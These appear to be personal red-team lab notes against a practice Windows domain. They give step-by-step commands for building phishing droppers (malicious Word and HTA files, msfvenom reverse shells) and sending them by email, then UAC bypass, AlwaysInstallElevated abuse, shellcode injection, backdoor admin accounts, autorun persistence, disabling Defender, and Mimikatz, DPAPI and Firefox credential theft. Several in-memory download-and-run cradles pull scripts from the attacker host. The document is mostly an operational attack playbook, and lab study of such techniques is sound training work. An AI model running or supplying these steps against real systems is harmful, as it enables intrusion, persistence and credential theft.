### Covenant Setup With *.doc* File Extension - Microsoft Word on Host
- Downloading onto host-machine:
	- Visit:
		- [[https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1]]
		- On desktop create `out-word.ps1` with the content from the above script
	- Go to `Covenenant`
		- Go to `Listeners`
			- Create `HTTP Listener` 
				- Name: `HTTP Listener`
				- ConnectAddress: `your-ip-address`
		- Go to `Lanchers`
			- Listnener: `HTTP Listener`
			- DotNetVersion: `Net40`
			- KillDate: `any-day-on-future-date` **make sure this is set properly**
			- `Generate`
			- Go to `Host` tab
			- Url: `/rev.ps1`
			- Copy `EncodedLauncher`
	- Back on Windows host-machine:
		- Go to `powershell.exe`
			- `cd Desktop`
			- `. .\out-word.ps1`
			- `Out-Word -Payload "insert copied EncodeLauncherScript -Outfile Benefits.doc"`
	- On kali machine:
		- `cd Desktop`
		- `smbserver.py Share . -smb2support`
	- Back on host-machine:
		- Go to `file-explorer`
			- In browser:
				- `\\192.168.3.28\Share`
		- Go to `file-explorer` in a second window
			- Go to `Documents`
				- Drag `Benefits.doc` to the kali share file
				- Test it locally
	- On kali machine:
		- Go to `Covenant`
			- Go to `Listeners`
				- Go to `Hosted Files`
				- `Create`
					- Path: `/Benefits.doc`
					- Content: `Benefits.doc` **what you just downloaded from Windows host since powershell.exe was needed to create script**
		- Go to `https://mail.mayorsec.com`
			- Generate the email with the `Benefits.doc` file attached
			- Send the email
	- On Windows host-machine:
		- Go to  `https://mail.mayorsec.com`
			- Click the link and accept the risk **Windows defender needs to be turned off for this and Microsoft Word needs to be present on the host machine**

### Covenant Setup With *.hta* file extension
- Important notes
	- **Ensure time on target machine and kali machine is set to the same time**
		- `timedatectl`
		- `timedatectl list-timezones | grep -i chicago`
		- `timedatectl set-timezone America/Chicago`
	- **Ensure the `launcher KillDate` is set to a future date**
- On Kali:
	- Create script `Benefits.hta`
```shell
# Defanged script

<\script> language="VBScript">
	Function doStuff()
		Dim wsh
		Set wsh = CreateObject("Wscript.Shell")
		wsh.run "<covenant powershell copied command goes here>"
		Set wsh = Nothing
	  End Function

	  DoStuff
	  self.close
<\script>

```
- Start `Covenant`
	- Go to `Covenenant`
		- Go to `Listeners`
			- Create `HTTP Listener` 
				- Name: `HTTP Listener`
				- ConnectAddress: `your-ip-address`
		- Go to `Launchers`
			- `Powershell`
				- Listnener: `HTTP Listener`
				- DotNetVersion: `Net40`
				- KillDate: `any-day-on-future-date` **make sure this is set properly**
				- `Generate`
				- Copy the `EncodedLauncher` and paste this in the designated spot in the `Benefits.hta` file
		- Go to `Listeners`
			- Click: `HTTP Listener`
				- Go to `Hosted Files`
				- `Create`
					- Path: `/Benefits.hta`
					- Content: `Benefits.hta` 
		- Go to `https://mail.mayorsec.com`
			- Generate the email with the `Benefits.hta` file attached
			- Send the email
	- On Windows host-machine:
		- Go to  `https://mail.mayorsec.com`
			- Click the link and accept the risk **Windows defender needs to be turned off for this and Microsoft Word needs to be present on the host machine**

### Covenant Commands
- `whoami`
- `Seatbelt -group=all`
- `PowerShellImport`
	- `PowerUp.ps1`
	- Specific to `PowerUp`:
		- `powershell invoke-allchecks`
- `Seatbelt WindowsAutoLogon`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221124143738.png)
- `SharpUp audit`
- `ChangeDirectory C:\Users\Public`
- `shell msiexec /quiet /qn /i MayorSecInstaller.msi`
	- Refer too *AlwaysInstallElevated Misconfiguration and Exploitation with Covenant* section


### Email Phishing With Metasploit and *.hta* File Extension
- On kali host:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f hta-psh -o Benefits.hta`
	- Transfer `Benefits.hta` over to Windows host-machine
		- `python3 -m http.server 80`
		- On Windows host-machine browse to:
			- `http://192.168.3.28/Benefits.hta`
			- Execute the file on host system  **Windows defender needs to be turned off for this and Microsoft Word needs to be present on the host machine**
	- Start Metasploit:
		- `msfconsole`
			- `use /exploit/multi/handle`
			- `set payload windows/x64/meterpreter/reverse_tcp`
			- `set lhost eth0`
			- `set lport 443`
			- `exploit`

### Meterpreter Relevant commands
- `sysinfo`
- `getuid`
- `ipconfig`
- `arp`
- `netstat -ano`
- `run post/windows/gatherer/enum_services`
- `run post/windows/gather/enum_applications`
- `run post/windows/gather/enum_domains` **No longer works on MSF6 (and apparently MSF5 also)**
- `route`
- `run post/multi/recon/local_exploit_suggester` **Top Tier Windows Command**
![image](https://0xc0rvu5.github.io/docs/assets/images/20221124160132.png)
- `run post/windows/gather/win_privs`

### AutoLogon Misconfiguration and Exploration
- Go to `Registry Editor`
	- `HKEY_LOCAL_MACHINE`
		- `Software`
			- `Microsoft`
				- `Windows NT`
					- `CurrentVersion`
						- Click: `Winlogon`
							- At top of list click `AutoAdminLogon`
								- Set `Value Data:`
									- `1`
						- Right click: `Winlogon`
							- Create 3 separate registry entry names with the corresponding values
							- `New`
								- `String Value`
									- `DefaultUserName`
										- `s.chisholm`
									- `DefaultPassword`
										- `FallOutBoy1!`
									- `DefaultDomainName`
										- `mayorsec`
- Restart the machine

### AlwaysInstallElevated Misconfiguration and Exploitation with Covenant
- **System level privileges**
- Go to `Registry Editor`
	- `HKEY_LOCAL_MACHINE
		- `SOFTWARE`
			- `Polcies`
				- `Microsoft`
					- Right click: `Windows` and create a *key* named `Installer`
					- `New`
						- `Key`
							- `Installer`
					- Right click: `Installer` and create a `32-bit DWORD` *value* called `AlwaysInstallElevated`
						- `New`
							- `32-bit DWORD`
								- `AlwaysInstallElevated`
									- Set `Value Data:`
										- `1`
	- Follow the same instructions for:
		- `HKEY_CURRENT_USER`
- On kali machine:
	- `msfvenom -p windows/exec CMD="insert EncodedLaunder here" -f msi -o MayorSecInstaller.msi`
		- Ensure you using DotNetVersion: `Net35`
- In `Covenant`:
	- `upload C:\Users\Public\test2.msi`
	- `ChangeDirectory C:\Users\Public`
	- Verify the file is in the directory
		- `ls`
	- `shell msiexec /quiet /qn /i test2.msi`

### AlwaysInstallElevated Misconfiguration and Exploitation with Metasploit
- **System level privileges**
- Reference the below link for initial shell creation
	- [[ Email Phishing With Metasploit and *.hta* File Extension]]
- `run post/multi/recon/local_exploit_suggester`
-  Press `CTRL-z` to background session
- `use exploit/windows/local/always_install_elevated`
	- `sessions`
	- `set session 2` **or whatever session id your shell is in**
	- `exploit -j` **runs exploit in background**
![image](https://0xc0rvu5.github.io/docs/assets/images/20221124160457.png)
- `sessions -i 3`
- `ps`
- `migrate 596`
	- This is `winlogon.exe` which is not a viable choice if there are multiple users in the environment

### Fodhelper UAC Bypass with Covenant
- **High level privileges**
- Open `Coveneant`
- Start a shell on the Windows host
	- [[Covenant Quick Shell on Windows Host]]
- `powershellimport`
	- `helper.ps1`
- Ensure you using DotNetVersion: `Net35`
	- Copy the encoded payload
- `powershell helper -custom "cmd.exe /c enter_payload_here"`
- Elevate to: **System level privileges**
	- In `Covenant` run:
		- `ps`
		- Find `winlogon.exe` and identify the PID
		- Go to `Launchers`
			- `ShellCode`
				- DotNetVersion: `Net40`
				- `Generate`
				- `Download`
		- `inject`
			- Enter the `winlogon.exe` PID
			- Add the recently generated shellcode *.bin* file
		- `Execute`


### UAC Bypass with Metasploit
- Refer to link below to generate a quick reverse shell
	- [[Metasploit Quick Shell Setup]]
```bash
- On kali host:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f hta-psh -o Benefits.hta`
	- Transfer `Benefits.hta` over to Windows host-machine
		- `python3 -m http.server 80`
		- On Windows host-machine browse to:
			- `http://192.168.3.28/Benefits.hta`
			- Execute the file on host system  **Windows defender needs to be turned off for this and Microsoft Word needs to be present on the host machine**
	- Start Metasploit:
		- `msfconsole`
			- `use /exploit/multi/handler`
			- `set payload windows/x64/meterpreter/reverse_tcp`
			- `set lhost eth0`
			- `set lport 443`
			- `exploit`
- On Windows Host execute the relevant shell created in `Downloads`
```
- `run post/multi/recon/local_exploit_suggester`
	- Copy: `exploit/windows/local/bypassuac_dotnet_profiler`
- Background session with `CTRL+z`
- `use exploit/windows/local/bypassuac_dotnet_profiler`
	- `set session 1`
- `exploit -j`
- `sessions -i 2`
- In shell you are administrator, but to elevate further *system level access*
	- `getsystem`
	- `ps`
		- Find a process that has *system level access*
		- `migrate PID`

### New User Persistence
- In `Covenant` in a `High` level access shell i.e *administrator access shell*
	- `shellcmd net user hacker3 Password123! /add && net localgroup administrators hacker3 /add`
	- Not a 1 liner:
		- `shellcmd net users hacker Password123! /add` 
		- `shell net localgroup administrators hacker /add`
- Alternatively in a `Medium` level access shell .ie. *user access shell*
	- `powershellimport`
	- `helper.ps1`
	- `powershell helper -custom "cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add"`
- Verify user was created
	- `shell net users`
- Verify user was put into *administrators* group
	- `shell net localgroup administrators`

## Startup Persistence With Covenant
- Ensure the Windows host Firewall does not interfere with testing by disabling it
- Refer too:
	- [[Disable Windows AntiVirus on Startup]]
```bash
- `gpedit`
	- `Computer Configuration`
		- `Administrative Templates`
			- `Windows Components`
				- `Microsoft Defender Antivirus`
					- `Turn off Microsoft Defender Antivirus`
						- `Enabled`
- `regedit` **as administrator**
	- `HKEY_LOCAL_MACHINE`
		- `SOFTWARE`
			- `Policies`
				- `Microsoft`
					- Right click: `Windows Defender`
						- New: `DWORD (32-bit) Value`
							- Name: `DisableAntiSpyware`
							- Double click and set value:
								- `1`
					- Right click: `Windows Defender`
						- New: `Key`
							- Name: `Real-Time Protection`
								- New: `DWORD (32-bit) Value`
									- Name: `DisableAntiSpyware`
									- Double click and set value:
										- `1
- If `gpedit` is not functioning properly refer too:
	- [[Gpedit Issue Resolution]]
```
- On `Covenant` ensure you have a `High` level privilege
	- Click on the `High` level privilege *grunt* in `Grunts` tab
	- Go to `Tasks`
		- GruntTask: `PersistStartup`
		- Go to: `Launchers`
			- `Host`
				- Copy the `EncodedLauncher`
		- Paste the copied payload into `Payload`
		- `Task`
- Restart the Windows Host

- Disable Windows AntiVirus on Startup
- `gpedit`
	- `Computer Configuration`
		- `Administrative Templates`
			- `Windows Components`
				- `Microsoft Defender Antivirus`
					- `Turn off Microsoft Defender Antivirus`
						- `Enabled`
- `regedit` **as administrator**
	- `HKEY_LOCAL_MACHINE`
		- `SOFTWARE`
			- `Policies`
				- `Microsoft`
					- Right click: `Windows Defender`
						- New: `DWORD (32-bit) Value`
							- Name: `DisableAntiSpyware`
							- Double click and set value:
								- `1`
					- ight click: `Windows Defender`
						- New: `Key`
							- Name: `Real-Time Protection`
								- New: `DWORD (32-bit) Value`
									- Name: `DisableAntiSpyware`
									- Double click and set value:
										- `1`

### Autorun Persistence
- On `Covenant` ensure you have a `High` level privilege
	- Click on the `High` level privilege *grunt* in `Grunts` tab
	- Go to `Launchers`
		- `Binary`
			- DotNetVersion: `Net40`
			- `Generate`
			- `Download`
	- Go to `Tasks`
		- GruntTask: `PersistAutorun`
		- Copy `Value`
			- `C:\Users\Public\autorun.exe`
	- On new `Grunts` tab
		- Go to `High` level grunt
			- `upload`
			- FilePath: 
				- `C:\Users\Public\autorun.exe`
			- FileContents: `Name of downloaded binary launcher `
				- `/root/Desktop/GruntHTTP.exe`
			- `Execute`
	- Go to `Tasks`
		- `Task`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221125053011.png)
- On Windows host go to: **for verification**
	- `regedit`
		- `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125053123.png)
- Alternatively:
	- Check in `Convenant`
		- `GetRegistryKey HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

### Session Passing to Metasploit SOCKS, and the Autoroute Module
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
```bash
- Open `Covenant`
	- Set up a listener in `Listeners` tab
		- Name: `HTTP Listener`
		- ConnectAddress: `your-ip-address`
		- `Create`
	- Set up a launcher in `Launchers`
		- `PowerShell`
			- Listener: `HTTP Listener`
			- DotNetVersion: `Net40`
				- For a short link: `Net35` **Net35 is manditory when using `msiexec` and fodhelper i.e. `helper.ps1`**
			- KillDate: `some date in future`
			- `Generate`
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
```
- Paste the generated payload into the Windows host `powershell.exe` window
```
- On Kali:
	- `msfconsole`
		- `search web_delivery`
		- `use 1`
		- `set target 2` **this sets up a powershell.exe shell**
		- `set payload windows/x64/meterpreter/reverse_http`
		- `set lhost eth0`
		- `set lport 8081`
		- `exploit -j`
		- Copy payload
	- Within the `Covenant` grunt session
		- `powershell copied_payload_here`
	- Back on `Metasploit`
		- `sessions -i 1`
		- `ipconfig`
		- `run autoroute -s 192.168.16.4/24`
		- Verify route is setup:
			- `run autoroute -p`
		- Port forward to access internal network devices that were not accessible before
			- `portfwd add -R -p 2222 -l 443 -L 192.168.3.28`
		- Verify:
			- `portfwd`
		- `CTRL-z`
		- `use auxiliary/server/socks4a`
	- `mousepad /etc/proxychains4.conf`
		- Go to bottom of file and verify the port being used
			- `9050`
	- Back on `Metasploit`
		- `set srvport 9050`
		- `exploit -j`
		- Check active jobs
			- `jobs`
			- Kill `web_delivery` due to it being unecessary now
				- `jobs -k ID`
		- Use the `portfwd` command to reference the following *listener* setup
	- Back on `Coveneant`
		- Go to `Listeners`
			- Create a new listener
				- Name: `Reverse HTTP`
				- BindPort: `443`
				- ConnectPort: `2222`
				- ConnectAddress: `192.168.16.4` **This will be in reference to the interface ID # 2 within the `ifconfig` output**
![image](https://0xc0rvu5.github.io/docs/assets/images/20221125163634.png)
- Go to `Launchers`
	- Listeners: `Reverse HTTP`
	- DotNetVersion: `Net40`
	- `Generate`
	- Go to `Hosts` tab
		- Url: `/test.ps1`
	- `Host`
	- Copy `EncodedLauncher`
- Go to Windows Workstation-02
	- Turn off the *Real-time protection*
	- Open *powershell.exe*
		- `copied EncodedLauncher here`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221125172311.png)
- Or
![image](https://0xc0rvu5.github.io/docs/assets/images/20221125172332.png)

### Persistence via RDP
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
```bash
- Open `Covenant`
	- Set up a listener in `Listeners` tab
		- Name: `HTTP Listener`
		- ConnectAddress: `your-ip-address`
		- `Create`
	- Set up a launcher in `Launchers`
		- `PowerShell`
			- Listener: `HTTP Listener`
			- DotNetVersion: `Net40`
				- For a short link: `Net35` **Net35 is manditory when using `msiexec` and fodhelper i.e. `helper.ps1`**
			- KillDate: `some date in future`
			- `Generate`
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
```
- Paste the generated payload into the Windows host `powershell.exe` window
```
- Open a `High` level grunt
	- [[Fodhelper UAC Bypass with Covenant]]
```bash
- **High level privileges**
- Open `Coveneant`
- Start a shell on the Windows host
	- [[Covenant Quick Shell on Windows Host]]
- `powershellimport`
	- `helper.ps1`
- Ensure you using DotNetVersion: `Net35`
	- Copy the encoded payload
- `powershell helper -custom "cmd.exe /c enter_payload_here"`
- Elevate to: **System level privileges**
	- In `Covenant` run:
		- `ps`
		- Find `winlogon.exe` and identify the PID
		- Go to `Launchers`
			- `ShellCode`
				- DotNetVersion: `Net40`
				- `Generate`
				- `Download`
		- `inject`
			- Enter the `winlogon.exe` PID
			- Add the recently generated shellcode *.bin* file
		- `Execute`
```
- Execute in `High` level grunt:
	- Enables *RDP* on Windows host
	- `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
- In terminal:
	- `xfreerdp /u:s.chisholm /p:'FallOutBoy1!' /v:192.168.3.4`
	- You will be prompted on Windows host to allow connection which, in turn, will disconnect the Windows host
- Disables *RDP* on Windows host
	- `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`

### Dumping Hashes with Covenant and Mimikatz
- This requires a `High` level grunt
- Open a grunt with `Covenant`
	- [[Covenant Quick Shell on Windows Host]]
```bash
- Open `Covenant`
	- Set up a listener in `Listeners` tab
		- Name: `HTTP Listener`
		- ConnectAddress: `your-ip-address`
		- `Create`
	- Set up a launcher in `Launchers`
		- `PowerShell`
			- Listener: `HTTP Listener`
			- DotNetVersion: `Net40`
				- For a short link: `Net35` **Net35 is manditory when using `msiexec` and fodhelper i.e. `helper.ps1`**
			- KillDate: `some date in future`
			- `Generate`
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20221125031343.png)
```
- Paste the generated payload into the Windows host `powershell.exe` window
```
- Open a `High` level grunt
	- [[Fodhelper UAC Bypass with Covenant]]
```bash
- **High level privileges**
- Open `Coveneant`
- Start a shell on the Windows host
	- [[Covenant Quick Shell on Windows Host]]
- `powershellimport`
	- `helper.ps1`
- Ensure you using DotNetVersion: `Net35`
	- Copy the encoded payload
- `powershell helper -custom "cmd.exe /c enter_payload_here"`
- Elevate to: **System level privileges**
	- In `Covenant` run:
		- `ps`
		- Find `winlogon.exe` and identify the PID
		- Go to `Launchers`
			- `ShellCode`
				- DotNetVersion: `Net40`
				- `Generate`
				- `Download`
		- `inject`
			- Enter the `winlogon.exe` PID
			- Add the recently generated shellcode *.bin* file
		- `Execute`
```
- Execute in `High` level grunt:
	- `Mimikatz token::elevate lsadump::secrets`
		- Locate any *cahced* credentials with the above output
	- `Mimikatz token::elevate lsadump::sam`
		- Hashes for user password will be located here
		- Note: The hashes are stored in `Covenant` under the `Data` tab
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126102648.png)

### Dumping Hashes with Metasploit
- On Kali:
	- `msfconsole`
		- `search web_delivery`
		- `use 1`
		- `set target 2` **this sets up a powershell.exe shell**
		- `set payload windows/x64/meterpreter/reverse_http`
		- `set lhost eth0`
		- `set lport 8081`
		- `exploit -j`
		- Copy payload
- On Windows host:
	- Open `Powershell as Administrator`
		- paste `copied payload here`
- On Kali:
	- `sessions -i 1`
	- Determine current user privileges
		- `run post/windows/gather/win_privs`
		- `getsystem`
		- `hashdump`
			- If any of the output hashes end in `c089c0` this most likely means the account is **disabled**
		- Load `mimikatz`
			- `load kiwi`
				- Determine relevant commands for `kiwi`
					- `help`
				- `creds_all`
					- Somewhat less relevant now
				- `lsa_dump_sam`
				- `lsa_dump_secrets`

### Rulelist Hash Cracking with Hashcat
- On Windows to utilize GPU
	- `.\hashcat.exe -a 0 -m 1000 3b866477b216ed62e3f1b00b8b289070 -r .\OneRuleToRuleThemAll.rule .\rockyou.txt`

### Cracking the Credential Vault with Covenant
- **Medium level credentials**
- Open remote desktop from `WORKSTATION-01` to `dc01` and ensure credentials are *saved*
- Go to `Covenant`
	- Open a `Medium` integrity `Grunt`
		- `mimikatz vault::cred`
		- `ls C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126122928.png)
-  Open a new tab in `Covenant`
	- Go to `Grunts`
		- Click on the current active `Medium` integrity `Grunt`
			- Go to `Task`
				- GruntTask: `Mimikatz`
				- Ensure double quotes are used for the `Command`
					- Command: `"dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5"`
				- `Task`
					- Note the `guidMasterKey` in the output
- Go back to the `Medium` integrity `Grunt`
	- `ls C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126123541.png)
- copy `C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\S-1-5-21-3457093242-545618575-2805282300-1113`
	- `ls C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\S-1-5-21-3457093242-545618575-2805282300-1113`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126123717.png)
- copy `C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\S-1-5-21-3457093242-545618575-2805282300-1113\7658586d-083f-49f4-ab5b-8f3575b6cbf8`
- Click the `Task` tab
	- Command: `"dpapi::masterkey /in:C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\S-1-5-21-3457093242-545618575-2805282300-1113\7658586d-083f-49f4-ab5b-8f3575b6cbf8 /rpc"`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126124051.png)
- In the output save the `key` *value*
	- 2: `cf717c7c2b29a1bc88a6c62bc18d1b2b618d286cccdfb51a7990d82804dac0dbbca0e72af611b39f36cbc754f4318078be76b7a512d9114317d0ed1f81bb49e3`
	- 1: Go back a few commands to `dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5` and copy this
	- Go to `Task`
		- Syntax goes "**1** `/masterkey:`**2**"
			- `"dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5 /masterkey:cf717c7c2b29a1bc88a6c62bc18d1b2b618d286cccdfb51a7990d82804dac0dbbca0e72af611b39f36cbc754f4318078be76b7a512d9114317d0ed1f81bb49e3"`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126124545.png)

### Cracking the Credential Vault via Metasploit
- Open a `Medium` integrity `meterpreter` session
	- [[Metasploit Quick Shell Setup]]
```bash
- On kali host:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f hta-psh -o Benefits.hta`
	- Transfer `Benefits.hta` over to Windows host-machine
		- `python3 -m http.server 80`
		- On Windows host-machine browse to:
			- `http://192.168.3.28/Benefits.hta`
			- Execute the file on host system  **Windows defender needs to be turned off for this and Microsoft Word needs to be present on the host machine**
	- Start Metasploit:
		- `msfconsole`
			- `use /exploit/multi/handler`
			- `set payload windows/x64/meterpreter/reverse_tcp`
			- `set lhost eth0`
			- `set lport 443`
			- `exploit`
- On Windows Host execute the relevant shell created in `Downloads`
```
- In `meterpreter`
	- `upload /opt/Tools/mimikatz_trunk/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe`
	- `shell`
	- `cd C:\Users\Public`
		- Verify *mimikatz.exe* was uploaded 
			- `dir`
		- `C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials`
			- Take the *hash* with the **smaller** file size
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126130955.png)
- Enter *mimikatz.exe*
	- `mimikatz.exe`
- Verify there are credentials in the **Windows Credentials** vault
	- `vault::cred`
- `dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5`
	- Note the `guidMasterKey` in the output
- `exit`
- Find the *SID* value
	- `dir /a C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect`
- 1: `dir /a C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\S-1-5-21-3457093242-545618575-2805282300-1113`
	- Output:
		- 2: `7658586d-083f-49f4-ab5b-8f3575b6cbf8`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126131836.png)
- Command: `dpapi::masterkey /in:`**1** **2** `/rpc`
- `dpapi::masterkey /in:C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\S-1-5-21-3457093242-545618575-2805282300-1113\7658586d-083f-49f4-ab5b-8f3575b6cbf8 /rpc`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126132049.png)
- In the output save the `key` **value**
	- 2: `cf717c7c2b29a1bc88a6c62bc18d1b2b618d286cccdfb51a7990d82804dac0dbbca0e72af611b39f36cbc754f4318078be76b7a512d9114317d0ed1f81bb49e3`
- Refer back to `dpapi::cred` command
	- 1: `dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5`
-  Syntax goes "**1** `/masterkey:`**2**"
- `dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5 /masterkey cf717c7c2b29a1bc88a6c62bc18d1b2b618d286cccdfb51a7990d82804dac0dbbca0e72af611b39f36cbc754f4318078be76b7a512d9114317d0ed1f81bb49e3`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126132558.png)

### Dumping Firefox Credentials with Metasploit
- Open `Metasploit`
- `search firefox`
- `use 55` or `use post/multi/gather/firefox_creds`
	- `set sessions ID`
- Change:
	- `mv /root/.msf4/loot/20221126133813_default_192.168.3.4_ff.zyke1oji.cert_342194.bin /root/.msf4/loot/cert9.db`
	- `mv .root/.msf4/loot/20221126133814_default_192.168.3.4_ff.zyke1oji.key4_198713.bin /root/.msf4/loot/key4.db`
	- `mv .root/.msf4/loot/20221126133814_default_192.168.3.4_ff.zyke1oji.logi_991515.bin /root/.msf4/loot/logins.json`
	- `mv .root/.msf4/loot/20221126133813_default_192.168.3.4_ff.zyke1oji.cook_004714.bin /root/.msf4/loot/cookies.sqlite`
- `cd /opt `
	- `git clone https://github.com/unode/firefox_decrypt; cd firefox_decrypt`
		- `./firefox_decrypt.py /root/.msf4/loot`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126134715.png)

### Offensive PowerShell Part 1 - Downloading Files with PowerShell
- Go to `Covenant`
	- `Listeners`
		- Click `HTTP Listener`
		- Go to `Hosted Files`
			- `Create`
				- Path: `/powerview.ps1`
				- Content: `locate file in file explorer`
- Go to Windows *Workstation-01* `powershell`
	- `cd Desktop`
		- Use `certutil`
			- `certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1`
		- Use `wget`
			- `wget http://192.168.3.28/powerview.ps1 -OutFile powerview.ps1`
		- Use `iex`
			- This downloads to *memory* so there is tangible file
			- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`

### Offensive PowerShell Part 2 - Enumerating Users
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- Find domain information
	- `get-netuser`
- Query only the users
	- `get-netuser | select cn`
- Query `samaccountname` or actual **login**
	- `get-netuser | select -ExpandProperty samaccountname`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126181439.png)
- Sometimes people leave **passwords** in the *description* fields
	- `find-userfield -SearchField description "password"`
	- `find-userfield -SearchField description "pass"`
	- `find-userfield -SearchField description "admin"`
![image](https://0xc0rvu5.github.io/docs/assets/images/20221126181721.png)

### Offensive PowerShell Part 3 - Enumerating Groups
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
-  Find domain groups
	- `get-netgroup`
- Search by *user*
	- `get-netgroup -UserName "s.chisholm"`
- Group specific information
	- This will show you who the members of each group are
	- `get-netgroup -GroupName "it admins" -FullData`
	- `get-netgroup -GroupName "senior management" -FullData`
	- `get-netgroup -GroupName "domain admins" -FullData` **important to note**

### Offensive PowerShell Part 4 - Enumerating Domain Computers and Shares
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- Find active computers
	- `get-netcomputer`
- Find active computers with all relevant data
	- `get-netcomputer -FullData`
- Find specific *OSes* 
	- `Get-NetComputer -OperatingSystem "*Windows 10*"`
	- `Get-NetComputer -OperatingSystem "*server 2019"`
- Find *file-shares*
	- `Invoke-ShareFinder`
	- `Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -verbose`
	- `Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC`

### Offensive PowerShell Part 5 - Invoke-FileFinder
 - Parse available *file-shares*
	 - `Invoke-FileFinder`

### Offensive PowerShell Part 6 - Enumerating Local Admin Users
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- `Invoke-EnumerateLocalAdmin`

### Offensive PowerShell Part 7 - Enumerating Group Policy Objects
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- `get-netgpo`
	- Notable mentions:
		- `WinRM Firewall TCP 5985`
		- `Enable PSRemoting Desktops`

### Offensive PowerShell Part 8 - Enumerating Access Control Lists
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- There will be thousand of *ACL* rules in this output
	- `get-objectacl`
- Note in this output `ActiveDirectoryRights : GenericAll` means the `IdenitityReference : mayorsec\Sales` has full rights to this group
	- This could lead to potential compromises
		- `get-objectacl -SamAccountName "engineering" -ResolveGUIDs`
		- Verify the users in `Sales` that have change rights of the `Engineering` group
			- `net group sales /domain`
		- Verify the users in the `Engineering` group
			- `net group engineering /domain`
		- Delete a user from the `Engineering` domain
			- This is only possible because the current user `s.chisholm` is a part of the `Sales` group
			- `net group engineering r.smith /del /domain`
		- Add `s.chisholm` to the `Engineering`
			- `net group engineering s.chisholm /add /domain`

### Offensive PowerShell Part 9 - Enumerating the Domain
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- `get-netdomain`
- `get-domainpolicy`
- `get-domainsid`


### Offensive PowerShell Part 10 - PowerShell Remoting
- Download `powerview.ps1` into memory
	- `iex(New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')`
- `Enter-PSSession -ComputerName workstation-02`
- `Enter-PSSession -ComputerName workstation-02 -Crential mayorsec\m.seitz`
- Alternatively,
	- `Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName workstation-02 -Credential mayorsec\m.seitz`

